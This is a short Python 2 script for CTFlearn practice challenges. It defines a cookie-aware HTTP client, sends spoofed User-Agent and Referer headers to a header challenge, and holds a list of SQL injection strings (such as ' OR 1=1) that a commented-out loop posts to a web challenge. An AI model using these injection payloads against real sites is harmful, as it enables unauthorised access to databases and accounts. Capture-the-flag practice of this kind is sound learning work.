import cookielib
import urllib2
import urllib

class httpclient:
	def __init__(self):
		self.cookies = cookielib.LWPCookieJar()
		self.handlers = [
			urllib2.HTTPHandler(),
			urllib2.HTTPSHandler(),
			urllib2.HTTPCookieProcessor(self.cookies)
			]
		self.magic_inputs = ["'+'%'+'", "'", "' OR 1=1", "#" , "1' or '1' = '1'))/*", "1' or '1' = '1'))#"]

	def decorate(self, request):
		# do nothing
		return

	def make_opener(self, uri, agent='Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11'):
		opener = urllib2.build_opener(*self.handlers)
		opener.addheaders = [('User-Agent', agent	)]
		opener.addheaders += [('Referer', uri)]
		return opener

	def fetch(self,uri, headers):
		req = urllib2.Request(uri)
		self.decorate(req)
		opener = self.make_opener(uri)
		self.patch_headers(opener, headers)
		return opener.open(req)

	def get(self,uri, data, headers):
		url_values = urllib.urlencode(data)
		uri = uri + '?' + url_values
		print(uri)
		req = urllib2.Request(uri)
		self.decorate(req)
		opener = self.make_opener(uri)
		self.patch_headers(opener, headers)
		return opener.open(req)

	def post(self, uri, data = dict(), headers=None): # data - dict()
		data = urllib.urlencode(data)
		req = urllib2.Request(uri, data)
		self.decorate(req)
		opener = self.make_opener(uri)
		self.patch_headers(opener, headers)
		return opener.open(req)

	def patch_headers(self, opener,headers):
		if (headers is None):
			return
		for k,v in headers:
			opener.addheaders = [ (ok,ov) if k != ok else (k,v) for ok, ov in opener.addheaders]

	def dump(self):
			for cookie in self.cookies:
				 print(cookie.name, cookie.value)



clt = httpclient()

data = clt.get('https://ctflearn.com/header.php', {}, [('User-Agent', 'Sup3rS3cr3tAg3nt'), ('Referer', 'awesomesauce.com')])
print(data.read())

"""
for x in clt.magic_inputs:
	data = clt.post('https://web.ctflearn.com/web4/', {'input' : x}).read()
	print(x)
	print(data)
	print('--------------------')
"""
